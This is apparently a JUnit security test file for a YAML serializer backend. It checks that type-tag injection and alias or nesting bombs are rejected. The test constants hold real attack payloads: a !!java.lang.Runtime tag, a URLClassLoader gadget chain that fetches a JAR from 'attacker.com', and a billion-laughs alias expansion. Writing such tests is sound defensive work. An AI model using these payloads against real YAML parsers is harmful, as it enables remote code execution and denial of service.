package org.peakaboo.framework.druthers;

import static org.junit.Assert.fail;

import org.junit.Test;
import org.peakaboo.framework.druthers.serialize.DruthersSerializerBackend;
import org.peakaboo.framework.druthers.serialize.DruthersSnakeYamlBackend;

/**
 * Security tests for DruthersSerializer backends.
 * <p>
 * These tests verify that the serialization backends properly protect against:
 * <ul>
 *   <li>Remote Code Execution (RCE) via type tag injection</li>
 *   <li>Denial of Service (DoS) via billion laughs and deep nesting attacks</li>
 * </ul>
 * <p>
 * Tests are designed to run against a single backend at a time using the
 * {@link #getBackend()} pattern from {@link DruthersBackendCompatibilityTest}.
 * Subclasses override {@code getBackend()} to test specific backend implementations.
 *
 * @see org.peakaboo.framework.druthers.serialize.SECURITY.md
 */
public class DruthersSecurityTest {

	// ========================================================================
	// Malicious YAML Samples
	// ========================================================================

	/**
	 * RCE Attack: Attempts to instantiate java.lang.Runtime via explicit type tag.
	 * <p>
	 * This attack vector is documented in CVE-2022-1471 (SnakeYAML) and represents
	 * a critical remote code execution vulnerability. The !!java.lang.Runtime tag
	 * attempts to instantiate the Runtime class which can execute arbitrary system
	 * commands.
	 * <p>
	 * <b>Expected:</b> Tag inspector should reject all !!java.* type tags
	 */
	protected static final String ATTACK_RCE_RUNTIME = """
		!!java.lang.Runtime
		name: malicious
		""";

	/**
	 * RCE Attack: Attempts gadget chain via javax.script.ScriptEngineManager.
	 * <p>
	 * This is a multi-stage attack that chains together legitimate Java classes
	 * to achieve code execution:
	 * <ol>
	 *   <li>ScriptEngineManager loads scripts from classpath</li>
	 *   <li>URLClassLoader downloads remote JAR from attacker server</li>
	 *   <li>URL specifies attacker-controlled endpoint</li>
	 * </ol>
	 * <p>
	 * <b>Expected:</b> Tag inspector should reject all !!javax.* and !!java.* type tags
	 */
	protected static final String ATTACK_RCE_SCRIPT_ENGINE = """
		!!javax.script.ScriptEngineManager [
		  !!java.net.URLClassLoader [[
		    !!java.net.URL ["http://attacker.com/malicious.jar"]
		  ]]
		]
		""";

	/**
	 * RCE Attack: Attempts to instantiate application class via explicit type tag.
	 * <p>
	 * This test verifies that not only !!java.* tags are blocked, but also
	 * custom application classes (!!org.peakaboo.*). While less dangerous than
	 * Runtime execution, arbitrary class instantiation can still lead to
	 * security issues via side effects in constructors or setters.
	 * <p>
	 * <b>Expected:</b> Tag inspector should reject ALL explicit type tags,
	 * including application-specific classes
	 */
	protected static final String ATTACK_RCE_CUSTOM_CLASS = """
		!!org.peakaboo.framework.druthers.DruthersBackendCompatibilityTest$SimpleObject
		name: injected
		value: 999
		flag: true
		""";

	/**
	 * DoS Attack: Billion Laughs (exponential alias expansion).
	 * <p>
	 * This attack creates exponential memory consumption through nested YAML aliases.
	 * This version creates many unique anchor/alias pairs to exceed the limit of 50.
	 * Each level references the previous level 5 times, creating deep nesting that
	 * should trigger the maxAliasesForCollections limit.
	 * <p>
	 * <b>Expected:</b> Exception due to maxAliasesForCollections limit (50) exceeded
	 */
	private static final String ATTACK_BILLION_LAUGHS = """
		a0: &a0 ["x"]
		a1: &a1 [*a0, *a0, *a0, *a0, *a0]
		a2: &a2 [*a1, *a1, *a1, *a1, *a1]
		a3: &a3 [*a2, *a2, *a2, *a2, *a2]
		a4: &a4 [*a3, *a3, *a3, *a3, *a3]
		a5: &a5 [*a4, *a4, *a4, *a4, *a4]
		a6: &a6 [*a5, *a5, *a5, *a5, *a5]
		a7: &a7 [*a6, *a6, *a6, *a6, *a6]
		a8: &a8 [*a7, *a7, *a7, *a7, *a7]
		a9: &a9 [*a8, *a8, *a8, *a8, *a8]
		a10: &a10 [*a9, *a9, *a9, *a9, *a9]
		a11: &a11 [*a10, *a10, *a10, *a10, *a10]
		root: *a11
		""";

	// ========================================================================
	// Backend Provider
	// ========================================================================

	/**
	 * Returns the backend implementation to test.
	 * Override this method in subclasses to test different backends.
	 */
	protected DruthersSerializerBackend getBackend() {
		// Default implementation for when this class is run directly
		return new DruthersSnakeYamlBackend();
	}

	// ========================================================================
	// Security Tests - RCE Prevention
	// ========================================================================

	@Test
	public void testRejectRuntimeTypeTag() {
		DruthersSerializerBackend backend = getBackend();

		try {
			backend.deserialize(ATTACK_RCE_RUNTIME, true, null, Object.class);
			fail("Should reject !!java.lang.Runtime type tag to prevent remote code execution");
		} catch (Exception e) {
			// Expected exception
		}
	}

	@Test
	public void testRejectScriptEngineTypeTag() {
		DruthersSerializerBackend backend = getBackend();

		try {
			backend.deserialize(ATTACK_RCE_SCRIPT_ENGINE, true, null, Object.class);
			fail("Should reject nested type tags to prevent gadget chain remote code execution");
		} catch (Exception e) {
			// Expected exception
		}
	}

	@Test
	public void testRejectCustomClassTypeTag() {
		DruthersSerializerBackend backend = getBackend();

		try {
			backend.deserialize(ATTACK_RCE_CUSTOM_CLASS, true, null, Object.class);
			fail("Should reject all explicit type tags, including application-specific classes");
		} catch (Exception e) {
			// Expected exception
		}
	}

	// ========================================================================
	// Security Tests - DoS Prevention
	// ========================================================================

	@Test
	public void testPreventBillionLaughs() {
		DruthersSerializerBackend backend = getBackend();

		try {
			backend.deserialize(ATTACK_BILLION_LAUGHS, true, null, Object.class);
			fail("Should reject YAML with excessive alias expansion (billion laughs attack)");
		} catch (Exception e) {
			// Expected exception
		}
	}

	@Test
	public void testPreventDeepNesting() {
		DruthersSerializerBackend backend = getBackend();

		// Generate 100-level deep nested structure
		// Nesting limit is 50, so this should fail
		StringBuilder deepNesting = new StringBuilder();
		for (int i = 0; i < 100; i++) {
			deepNesting.append("level").append(i).append(": {");
		}
		deepNesting.append("value: deep");
		for (int i = 0; i < 100; i++) {
			deepNesting.append("}");
		}

		String maliciousYaml = deepNesting.toString();

		try {
			backend.deserialize(maliciousYaml, true, null, Object.class);
			fail("Should reject YAML with excessive nesting depth to prevent stack overflow");
		} catch (Exception e) {
			// Expected exception
		}
	}

}
